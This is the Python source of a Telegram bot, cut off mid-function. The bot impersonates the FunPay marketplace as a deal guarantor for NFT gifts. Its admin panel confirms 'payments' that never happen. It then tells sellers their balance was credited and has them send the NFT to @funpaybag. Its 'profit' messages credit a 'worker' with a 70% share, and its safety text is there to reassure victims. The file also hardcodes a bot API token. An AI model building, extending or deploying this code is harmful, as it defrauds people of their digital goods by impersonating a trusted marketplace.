import sqlite3
import random
import string
import re
import html
import csv
import io
from datetime import datetime
from typing import Optional, Dict, Any
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
import sys
import os
import asyncio
from aiohttp import web

print("=== БОТ НАЧИНАЕТ ЗАГРУЗКУ ===")

# ============ WEB-СЕРВЕР ============
async def health(request):
    return web.Response(text="Bot is running ✅")

app = web.Application()
app.router.add_get('/', health)

async def start_web():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print("🌐 Web server started on port 8080")

# ============ НАЛАШТУВАННЯ ============
API_TOKEN = '8698578814:AAEavw5BZ7nj6czWH5Dq6g22r4WGfvzRHHo'
LOG_CHAT_ID = -1004451013532
PROFIT_CHAT_ID = -1004451013532
LOG_THREAD_ID = 2986
PROFIT_THREAD_ID = 159
ADMIN_IDS = [8323946313]
DB_PATH = "funpay.db"
BOT_USERNAME = "IoIzDeaIs_bot"

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# ============ INLINE КЛАВІАТУРИ (ЯК НА ФОТО) ============

def main_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🆕 Создать сделку", callback_data="create_deal"),
        InlineKeyboardButton("💰 Баланс", callback_data="balance"),
        InlineKeyboardButton("📋 Мои сделки", callback_data="my_deals"),
        InlineKeyboardButton("✅ Верификация", callback_data="verify"),
        InlineKeyboardButton("💳 Реквизиты", callback_data="requisites"),
        InlineKeyboardButton("🌐 Язык", callback_data="language"),
        InlineKeyboardButton("🛡 Безопасно ли это?", callback_data="safety"),
        InlineKeyboardButton("🆘 Поддержка", callback_data="support")
    )
    return kb

def back_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 Вернуться в меню", callback_data="back_to_menu"))
    return kb

def role_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("👤 Покупатель", callback_data="role_buyer"),
        InlineKeyboardButton("👤 Продавец", callback_data="role_seller"),
        InlineKeyboardButton("❌ Отмена", callback_data="cancel_deal")
    )
    return kb

def currency_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    currencies = [
        ("💎 TON", "TON"),
        ("₽ RUB", "RUB"),
        ("$ USD", "USD"),
        ("₴ UAH", "UAH"),
        ("⭐ Stars", "Stars"),
        ("💵 USDT", "USDT"),
        ("₸ KGS", "KGS"),
        ("₸ UZS", "UZS"),
        ("₽ BYN", "BYN"),
        ("₸ KZT", "KZT")
    ]
    for label, value in currencies:
        kb.add(InlineKeyboardButton(label, callback_data=f"currency_{value}"))
    kb.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel_deal"))
    return kb

def admin_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📋 Все сделки", callback_data="admin_all_deals"),
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("✅ Подтвердить оплату", callback_data="admin_payment"),
        InlineKeyboardButton("✅ Подтвердить передачу", callback_data="admin_transfer"),
        InlineKeyboardButton("💳 Пополнить баланс", callback_data="admin_topup"),
        InlineKeyboardButton("📩 Рассылка", callback_data="admin_broadcast"),
        InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
        InlineKeyboardButton("📤 Экспорт", callback_data="admin_export"),
        InlineKeyboardButton("🔙 В главное меню", callback_data="back_to_menu")
    )
    return kb

print("✅ Inline клавиатуры загружены")

# ============ БАЗА ДАНИХ ============
def init_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                language TEXT DEFAULT 'ru',
                verified INTEGER DEFAULT 0,
                balance_ton REAL DEFAULT 0,
                balance_rub REAL DEFAULT 0,
                balance_usd REAL DEFAULT 0,
                balance_uah REAL DEFAULT 0,
                balance_stars REAL DEFAULT 0,
                balance_usdt REAL DEFAULT 0,
                balance_kgs REAL DEFAULT 0,
                balance_uzs REAL DEFAULT 0,
                balance_byn REAL DEFAULT 0,
                balance_kzt REAL DEFAULT 0,
                requisites TEXT DEFAULT '',
                created_at TEXT
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS deals (
                deal_id TEXT PRIMARY KEY,
                creator_id INTEGER NOT NULL,
                creator_role TEXT NOT NULL,
                participant_id INTEGER,
                participant_role TEXT,
                amount REAL NOT NULL,
                currency TEXT NOT NULL,
                description TEXT,
                status TEXT DEFAULT 'created',
                created_at TEXT,
                completed_at TEXT
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_type TEXT NOT NULL,
                user_id INTEGER,
                username TEXT,
                deal_id TEXT,
                action TEXT,
                details TEXT,
                created_at TEXT
            )
        ''')
        conn.commit()
        conn.close()
        print("✅ База данных создана успешно!")
    except Exception as e:
        print(f"❌ Ошибка создания БД: {e}")

init_db()

# ============ СТАНИ ============
class DealStates(StatesGroup):
    choose_role = State()
    choose_currency = State()
    enter_amount = State()
    enter_description = State()

class AdminStates(StatesGroup):
    waiting_payment_deal_id = State()
    waiting_transfer_deal_id = State()
    waiting_broadcast_text = State()
    waiting_topup_user_id = State()
    waiting_topup_amount = State()

# ============ ДОПОМІЖНІ ФУНКЦІЇ ============
def get_db():
    return sqlite3.connect(DB_PATH)

def generate_deal_id():
    return '#716MZK' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_user_balance(user_id):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            SELECT balance_ton, balance_rub, balance_usd, balance_uah, 
                   balance_stars, balance_usdt, balance_kgs, balance_uzs, 
                   balance_byn, balance_kzt 
            FROM users WHERE user_id = ?
        ''', (user_id,))
        result = cur.fetchone()
        conn.close()
        return result if result else (0,0,0,0,0,0,0,0,0,0)
    except:
        return (0,0,0,0,0,0,0,0,0,0)

def update_balance(user_id, currency, amount):
    try:
        currency_map = {
            "TON": "balance_ton", "RUB": "balance_rub", "USD": "balance_usd",
            "UAH": "balance_uah", "Stars": "balance_stars", "USDT": "balance_usdt",
            "KGS": "balance_kgs", "UZS": "balance_uzs", "BYN": "balance_byn", "KZT": "balance_kzt"
        }
        column = currency_map.get(currency)
        if not column or amount <= 0:
            return False
        conn = get_db()
        cur = conn.cursor()
        cur.execute(f"UPDATE users SET {column} = {column} + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
        updated = cur.rowcount > 0
        conn.close()
        return updated
    except:
        return False

def get_all_user_ids():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM users")
        rows = cur.fetchall()
        conn.close()
        return [row[0] for row in rows]
    except:
        return []

def get_deal_by_id(deal_id):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM deals WHERE deal_id = ?", (deal_id,))
        row = cur.fetchone()
        conn.close()
        return row
    except:
        return None

def set_deal_status(deal_id, status):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("UPDATE deals SET status = ? WHERE deal_id = ?", (status, deal_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def get_last_deals(limit=20):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM deals ORDER BY created_at DESC LIMIT ?", (limit,))
        rows = cur.fetchall()
        conn.close()
        return rows
    except:
        return []

def get_statistics():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM deals")
        total_deals = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM users")
        total_users = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM deals WHERE status = 'completed'")
        completed_deals = cur.fetchone()[0]
        
        cur.execute("SELECT currency, SUM(amount) FROM deals WHERE status = 'completed' GROUP BY currency")
        turnovers = cur.fetchall()
        
        conn.close()
        return {"total_deals": total_deals, "total_users": total_users, "completed_deals": completed_deals, "turnovers": turnovers}
    except:
        return {"total_deals": 0, "total_users": 0, "completed_deals": 0, "turnovers": []}

# ============ NFT ПАРСИНГ ============
async def get_nft_price(nft_url: str, timeout: int = 10) -> Optional[float]:
    if not nft_url or "t.me/nft" not in nft_url:
        return None
    try:
        import aiohttp
        headers = {"User-Agent": "Mozilla/5.0"}
        timeout_cfg = aiohttp.ClientTimeout(total=timeout)
        async with aiohttp.ClientSession(timeout=timeout_cfg, headers=headers) as session:
            async with session.get(nft_url) as response:
                if response.status != 200:
                    return None
                html_text = await response.text()
    except:
        return None
    patterns = [
        r'property=["\']og:price:amount["\']\s+content=["\']([\d.,]+)["\']',
        r'data-price=["\']([\d.,]+)["\']',
        r'([\d]+(?:[.,]\d+)?)\s*TON\b',
        r'\$\s*([\d]+(?:[.,]\d+)?)',
    ]
    for pattern in patterns:
        match = re.search(pattern, html_text, re.IGNORECASE)
        if match:
            raw_value = match.group(1).replace(",", ".")
            parts = raw_value.split(".")
            if len(parts) > 2:
                raw_value = "".join(parts[:-1]) + "." + parts[-1]
            try:
                price = float(raw_value)
                if price > 0:
                    return price
            except:
                continue
    return None

def detect_currency(nft_url: str) -> str:
    if "TON" in nft_url.upper():
        return "TON"
    elif "RUB" in nft_url.upper():
        return "RUB"
    elif "USD" in nft_url.upper():
        return "USD"
    return "Stars"

async def get_nft_data(nft_url: str) -> Dict[str, Any]:
    price = await get_nft_price(nft_url)
    currency = detect_currency(nft_url)
    return {"price": price, "currency": currency}

# ============ ЛОГИ ============
async def log_and_notify(log_type, user_id, username, deal_id, action, details):
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO logs (log_type, user_id, username, deal_id, action, details, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (log_type, user_id, username or "", deal_id or "", action, details, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except:
        pass
    try:
        emoji = {"deal_created": "🟢", "deal_joined": "🔵", "deal_paid": "💰", "deal_completed": "✅", "admin_action": "🛠️", "error": "⚠️"}.get(log_type, "ℹ️")
        safe_details = html.escape(details) if details else ""
        safe_action = html.escape(action) if action else ""
        safe_deal_id = html.escape(deal_id) if deal_id else "—"
        user_display = f"@{html.escape(username)}" if username else "без username"
        timestamp = datetime.now().strftime("%d.%m.%Y %H:%M")
        text = f"{emoji} <b>Лог | {timestamp}</b>\n📌 Тип: {log_type}\n👤 {user_display} (<code>{user_id}</code>)\n📎 Сделка: <code>{safe_deal_id}</code>\n📝 {safe_action}\n📄 {safe_details}"
        await bot.send_message(LOG_CHAT_ID, text, parse_mode="HTML", message_thread_id=LOG_THREAD_ID if LOG_THREAD_ID else None)
    except:
        pass

# ============ ПРОФІТИ ============
async def send_profit_message(deal_id, profit_amount, nft_link, worker_username, worker_share, worker_percent=70.0, currency="Stars"):
    text = (
        "💎 НОВЫЙ ПРОФИТ\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 ПРОФИТ · NFT\n"
        f"📎 СДЕЛКА: <code>{deal_id}</code>\n"
        f"💰 СУММА ПРОФИТА: <b>{profit_amount:.2f} {currency}</b>\n"
        f"🎁 ПОДАРОК: {nft_link}\n"
        f"👤 ВОРКЕР: @{worker_username}\n"
        f"📊 ДОЛЯ ВОРКЕРА: <b>{worker_share:.2f} ({worker_percent:.0f}%)</b>\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        await bot.send_message(PROFIT_CHAT_ID, text, parse_mode="HTML", message_thread_id=PROFIT_THREAD_ID if PROFIT_THREAD_ID else None)
        return True
    except:
        return False

# ============ ХЕНДЛЕРИ ============
@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username
        conn = get_db()
        cur = conn.cursor()
        cur.execute('INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?, ?, ?)', (user_id, username, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        args = message.get_args()
        print(f"🔍 Получен /start с параметром: {args}")
        
        if args and args.startswith('deal_'):
            deal_id = '#' + args.replace('deal_', '').strip()
            print(f"🔍 Ищем сделку: {deal_id}")
            deal = get_deal_by_id(deal_id)
            if not deal:
                await message.answer("❌ Сделка не найдена.", reply_markup=None)
                return
            if deal[3] is not None:
                await message.answer("❌ К этой сделке уже подключились.", reply_markup=None)
                return
            if user_id == deal[1]:
                await message.answer("❌ Вы создали эту сделку. Ожидайте подключения второй стороны.", reply_markup=None)
                return
            participant_role = 'Продавец' if deal[2] == 'Покупатель' else 'Покупатель'
            conn = get_db()
            cur = conn.cursor()
            cur.execute('UPDATE deals SET participant_id = ?, participant_role = ?, status = "active" WHERE deal_id = ?', (user_id, participant_role, deal_id))
            conn.commit()
            conn.close()
            await message.answer(
                f"✅ Вы успешно присоединились к сделке {deal_id} как {participant_role.lower()}.\n\n"
                f"📦 Товар/описание: {deal[7]}\n"
                f"💰 Сумма: {deal[5]} {deal[6]}\n\n"
                f"⏳ Ожидайте оплату от {'покупателя' if participant_role == 'Продавец' else 'продавца'}. После оплаты бот уведомит вас.",
                parse_mode="HTML"
            )
            await log_and_notify('deal_joined', user_id, message.from_user.username, deal_id, f'Участник вступил в сделку', f'Сумма: {deal[5]} {deal[6]}')
            return
        
        await message.answer_photo(
            photo="https://i.imgur.com/FunPayLogo.png",
            caption="🎉 <b>Добро пожаловать в FunPay.</b>\n\n💎 0% комиссии, нажми кнопки ниже чтобы открыть маркет",
            parse_mode="HTML",
            reply_markup=main_menu()
        )
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}")
        print(f"❌ Ошибка в cmd_start: {e}")

# ============ ОБРОБКА INLINE КНОПОК ============
@dp.callback_query_handler(lambda c: c.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.message.answer_photo(
        photo="https://i.imgur.com/FunPayLogo.png",
        caption="🎉 <b>Добро пожаловать в FunPay.</b>\n\n💎 0% комиссии, нажми кнопки ниже чтобы открыть маркет",
        parse_mode="HTML",
        reply_markup=main_menu()
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "create_deal")
async def create_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "📝 <b>Создание сделки</b>\n\n"
        "Выберите вашу роль в этой сделке:",
        parse_mode="HTML",
        reply_markup=role_menu()
    )
    await DealStates.choose_role.set()
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "cancel_deal")
async def cancel_deal(callback: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await callback.message.edit_text(
        "❌ Создание сделки отменено.",
        parse_mode="HTML",
        reply_markup=main_menu()
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("role_"), state=DealStates.choose_role)
async def process_role(callback: types.CallbackQuery, state: FSMContext):
    role = "Покупатель" if callback.data == "role_buyer" else "Продавец"
    await state.update_data(role=role)
    await callback.message.edit_text(
        f"✅ Выбрана роль: <b>{role}</b>\n\n"
        "💳 Выберите метод оплаты:",
        parse_mode="HTML",
        reply_markup=currency_menu()
    )
    await DealStates.choose_currency.set()
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("currency_"), state=DealStates.choose_currency)
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.replace("currency_", "")
    await state.update_data(currency=currency)
    await callback.message.edit_text(
        f"💳 Метод оплаты: <b>{currency}</b>\n\n"
        "💰 Введите сумму в формате: <b>100</b>",
        parse_mode="HTML",
        reply_markup=None
    )
    await DealStates.enter_amount.set()
    await callback.answer()

@dp.message_handler(state=DealStates.enter_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer(
            "❌ <b>Некорректная сумма</b>\n\n"
            "Введите положительное число (например: 100 или 50.5)",
            parse_mode="HTML"
        )
        return
    await state.update_data(amount=amount)
    await message.answer(
        "📦 <b>Укажите ссылку на NFT-подарок или опишите, на что создается сделка.</b>\n\n"
        "Пример: https://t.me/nft/PlushPepe-1",
        parse_mode="HTML"
    )
    await DealStates.enter_description.set()

@dp.message_handler(state=DealStates.enter_description)
async def process_description(message: types.Message, state: FSMContext):
    if len(message.text) < 5:
        await message.answer(
            "❌ <b>Описание слишком короткое</b>\n\n"
            "Минимум 5 символов.",
            parse_mode="HTML"
        )
        return
    data = await state.get_data()
    deal_id = generate_deal_id()
    
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO deals (deal_id, creator_id, creator_role, amount, currency, description, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (deal_id, message.from_user.id, data['role'], data['amount'], data['currency'], message.text, 'created', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id.replace('#', '')}"
    
    await message.answer_photo(
        photo="https://i.imgur.com/FunPayDealCreated.png",
        caption=(
            f"✅ <b>Сделка успешно создана!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"📎 ID сделки: <code>{deal_id}</code>\n"
            f"👤 Ваша роль: <b>{data['role']}</b>\n"
            f"💰 Сумма: <b>{data['amount']} {data['currency']}</b>\n"
            f"📦 Товар: {message.text}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 <b>Ссылка для второй стороны:</b>\n"
            f"<code>{deal_link}</code>"
        ),
        parse_mode="HTML"
    )
    await log_and_notify('deal_created', message.from_user.id, message.from_user.username, deal_id, f'Создана сделка на {data["amount"]} {data["currency"]}', message.text[:50])
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == "balance")
async def balance(callback: types.CallbackQuery):
    try:
        user_id = callback.from_user.id
        balance = get_user_balance(user_id)
        text = (
            "💳 <b>Ваш баланс FunPay</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 TON: <b>{balance[0]:.3f}</b>\n"
            f"₽ RUB: <b>{balance[1]:.2f}</b>\n"
            f"$ USD: <b>{balance[2]:.2f}</b>\n"
            f"₴ UAH: <b>{balance[3]:.2f}</b>\n"
            f"⭐ Stars: <b>{balance[4]:.0f}</b>\n"
            f"💵 USDT: <b>{balance[5]:.2f}</b>\n"
            f"₸ KGS: <b>{balance[6]:.2f}</b>\n"
            f"₸ UZS: <b>{balance[7]:.2f}</b>\n"
            f"₽ BYN: <b>{balance[8]:.2f}</b>\n"
            f"₸ KZT: <b>{balance[9]:.2f}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("💳 Пополнить баланс", callback_data="deposit"),
            InlineKeyboardButton("💸 Вывести баланс", callback_data="withdraw"),
            InlineKeyboardButton("🔙 Вернуться в меню", callback_data="back_to_menu")
        )
        await callback.message.delete()
        await callback.message.answer_photo(
            photo="https://i.imgur.com/FunPayBalance.png",
            caption=text,
            parse_mode="HTML",
            reply_markup=kb
        )
    except Exception as e:
        await callback.message.edit_text(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=back_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "my_deals")
async def my_deals(callback: types.CallbackQuery):
    try:
        user_id = callback.from_user.id
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            SELECT deal_id, amount, currency, status 
            FROM deals 
            WHERE creator_id = ? OR participant_id = ? 
            ORDER BY created_at DESC LIMIT 10
        ''', (user_id, user_id))
        deals = cur.fetchall()
        conn.close()
        if not deals:
            await callback.message.edit_text("📭 У вас пока нет сделок.", reply_markup=back_menu())
            await callback.answer()
            return
        text = "📋 <b>Ваши последние сделки</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for deal in deals:
            status_emoji = "✅" if deal[3] == "completed" else "⏳"
            text += f"{status_emoji} {deal[0]} | {deal[1]} {deal[2]}\n"
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=back_menu())
    except Exception as e:
        await callback.message.edit_text(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=back_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "verify")
async def verify(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.message.answer_photo(
        photo="https://i.imgur.com/FunPayVerify.png",
        caption="🔐 <b>Верификация FunPay</b>\n\nВаш статус: <b>не верифицирован</b>\n\nℹ️ Этот бот показывает статус только внутри текущего гаранта.\nОфициальной проверки сторонних площадок здесь нет.",
        parse_mode="HTML",
        reply_markup=back_menu()
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "requisites")
async def requisites(callback: types.CallbackQuery):
    try:
        user_id = callback.from_user.id
        conn = get_db()
        cur = conn.cursor()
        cur.execute('SELECT requisites FROM users WHERE user_id = ?', (user_id,))
        result = cur.fetchone()
        conn.close()
        if result and result[0]:
            await callback.message.edit_text(
                f"💳 <b>Ваши реквизиты</b>\n\n{result[0]}",
                parse_mode="HTML",
                reply_markup=back_menu()
            )
        else:
            await callback.message.edit_text(
                "💳 <b>Введите номер телефона или номер карты, куда отправлять деньги после завершения сделки.</b>",
                parse_mode="HTML"
            )
            await DealStates.choose_currency.set()
    except Exception as e:
        await callback.message.edit_text(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=back_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "language")
async def language(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(row_width=2)
    langs = [
        "🇬🇧 English", "🇷🇺 Русский", "🇺🇦 Українська",
        "🇨🇳 中文", "🇰🇿 Қазақша", "🇰🇷 한국어",
        "🇯🇵 日本語", "🇩🇪 Deutsch", "🇸🇦 العربية"
    ]
    for lang in langs:
        kb.add(InlineKeyboardButton(lang, callback_data=f"lang_{lang}"))
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu"))
    await callback.message.edit_text(
        "🌐 <b>Сменить язык:</b>",
        parse_mode="HTML",
        reply_markup=kb
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data.startswith("lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.replace("lang_", "")
    user_id = callback.from_user.id
    conn = get_db()
    cur = conn.cursor()
    cur.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, user_id))
    conn.commit()
    conn.close()
    await callback.message.edit_text(
        f"✅ Язык изменен на {lang}",
        parse_mode="HTML",
        reply_markup=back_menu()
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "safety")
async def safety(callback: types.CallbackQuery):
    text = """
🛡 <b>Безопасность сделок FunPay</b>
━━━━━━━━━━━━━━━━━━━━

1️⃣ Сделка фиксируется внутри бота
Каждая сделка получает отдельный номер. Внутри сохраняются сумма, валюта, роль создателя, описание товара, участники и текущий статус.

2️⃣ Вторая сторона подключается только к конкретной сделке
После создания бот выдает ссылку и команду вида /deal123. Пользователь, который перешел по этой ссылке, подключается именно к указанной сделке.

3️⃣ Деньги и товар не смешиваются в одном шаге
Бот отдельно показывает сумму, способ оплаты, описание товара и реквизиты.

4️⃣ Участники видят свои роли
В сделке явно указано, кто покупатель, кто продавец, кто создал сделку и кто подключился вторым участником.

5️⃣ Статус сделки отслеживается
У сделки есть статус: создана, участник подключился, оплата отмечена.

6️⃣ Доступ к информации ограничен участниками
Карточка конкретной сделки показывает только ее участникам.

7️⃣ Всегда сверяйте номер сделки, сумму, валюту, описание и username

⚠️ <b>Главное правило:</b>
Безопасной считается только та сделка, условия которой совпадают в карточке бота и у обеих сторон.
"""
    await callback.message.delete()
    await callback.message.answer_photo(
        photo="https://i.imgur.com/FunPaySafety.png",
        caption=text,
        parse_mode="HTML",
        reply_markup=back_menu()
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "support")
async def support(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.message.answer_photo(
        photo="https://i.imgur.com/FunPaySupport.png",
        caption="🆘 <b>Поддержка FunPay</b>\n\n👨‍💻 Свяжитесь с нами: @FunPaySupport\n\n⏱ Мы отвечаем в течение 15 минут.",
        parse_mode="HTML",
        reply_markup=back_menu()
    )
    await callback.answer()

# ============ АДМИН-ПАНЕЛЬ ============
@dp.message_handler(commands=["admin"])
async def cmd_admin(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ У вас нет доступа к этой команде.")
        return
    await message.answer_photo(
        photo="https://i.imgur.com/FunPayAdmin.png",
        caption="🔐 <b>Админ-панель FunPay</b>\n\nВыберите действие:",
        parse_mode="HTML",
        reply_markup=admin_menu()
    )

@dp.callback_query_handler(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    deals = get_last_deals(20)
    if not deals:
        await callback.message.edit_text("📭 Сделок пока нет.", reply_markup=admin_menu())
        await callback.answer()
        return
    text = "📋 <b>Последние 20 сделок</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for d in deals:
        status_emoji = {"created": "🟡", "active": "🟢", "paid": "💰", "completed": "✅"}.get(d[8], "⚪")
        text += f"{status_emoji} {d[0]} | {d[5]} {d[6]} | {d[8]}\n   Создатель: {d[1]} | Участник: {d[3] or '❌'}\n   📅 {d[9][:16]}\n\n"
    await callback.message.edit_text(text[:4000], parse_mode="HTML", reply_markup=admin_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    stats = get_statistics()
    text = f"📊 <b>СТАТИСТИКА FUNPAY</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━\n"
    text += f"👥 Пользователей: <b>{stats['total_users']}</b>\n"
    text += f"📋 Всего сделок: <b>{stats['total_deals']}</b>\n"
    text += f"✅ Завершено: <b>{stats['completed_deals']}</b>\n\n"
    text += "💰 <b>Оборот по валютам:</b>\n"
    if stats['turnovers']:
        for cur, amount in stats['turnovers']:
            text += f"   {cur}: <b>{amount:.2f}</b>\n"
    else:
        text += "   ❌ Нет завершённых сделок\n"
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=admin_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "admin_payment")
async def admin_payment(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    await callback.message.edit_text(
        "✅ <b>Подтверждение оплаты</b>\n\n"
        "Введите ID сделки для подтверждения оплаты:\n"
        "Пример: #716MZK100",
        parse_mode="HTML"
    )
    await AdminStates.waiting_payment_deal_id.set()
    await callback.answer()

@dp.message_handler(state=AdminStates.waiting_payment_deal_id)
async def admin_payment_process(message: types.Message, state: FSMContext):
    try:
        deal_id = message.text.strip()
        deal = get_deal_by_id(deal_id)
        if not deal:
            await message.answer("❌ Сделка не найдена.", reply_markup=admin_menu())
            await state.finish()
            return
        if deal[8] not in ("created", "active"):
            await message.answer(f"⚠️ Сделка в статусе: {deal[8]}. Подтверждение оплаты невозможно.", reply_markup=admin_menu())
            await state.finish()
            return
        set_deal_status(deal_id, "paid")
        await log_and_notify('deal_paid', message.from_user.id, message.from_user.username, deal_id, 'Оплата подтверждена', f'Сумма: {deal[5]} {deal[6]}')
        await bot.send_message(deal[1], f"✅ Оплата по сделке {deal_id} подтверждена!\n\nОжидайте передачи NFT от продавца.")
        if deal[3]:
            await bot.send_message(deal[3], f"✅ Покупатель успешно оплатил сделку {deal_id}.\n\n💳 Ваш баланс FunPay пополнен на: {deal[5]} {deal[6]}\nСредства зафиксированы системой.\n\n📤 Передайте NFT-подарок на @funpaybag и подтвердите передачу.")
        await message.answer(f"✅ Оплата по сделке {deal_id} подтверждена.", reply_markup=admin_menu())
        await state.finish()
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=admin_menu())
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == "admin_transfer")
async def admin_transfer(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    await callback.message.edit_text(
        "✅ <b>Подтверждение передачи</b>\n\n"
        "Введите ID сделки для подтверждения передачи NFT:\n"
        "Пример: #716MZK100",
        parse_mode="HTML"
    )
    await AdminStates.waiting_transfer_deal_id.set()
    await callback.answer()

@dp.message_handler(state=AdminStates.waiting_transfer_deal_id)
async def admin_transfer_process(message: types.Message, state: FSMContext):
    try:
        deal_id = message.text.strip()
        deal = get_deal_by_id(deal_id)
        if not deal:
            await message.answer("❌ Сделка не найдена.", reply_markup=admin_menu())
            await state.finish()
            return
        if deal[8] != "paid":
            await message.answer(f"⚠️ Сделка в статусе: {deal[8]}. Подтверждение передачи невозможно.", reply_markup=admin_menu())
            await state.finish()
            return
        seller_id = None
        if deal[2] == "Продавец":
            seller_id = deal[1]
        elif deal[4] == "Продавец":
            seller_id = deal[3]
        if not seller_id:
            await message.answer("⚠️ Не удалось определить продавца.", reply_markup=admin_menu())
            await state.finish()
            return
        if update_balance(seller_id, deal[6], deal[5]):
            set_deal_status(deal_id, "completed")
            await log_and_notify('deal_completed', message.from_user.id, message.from_user.username, deal_id, 'Сделка завершена', f'Продавцу начислено {deal[5]} {deal[6]}')
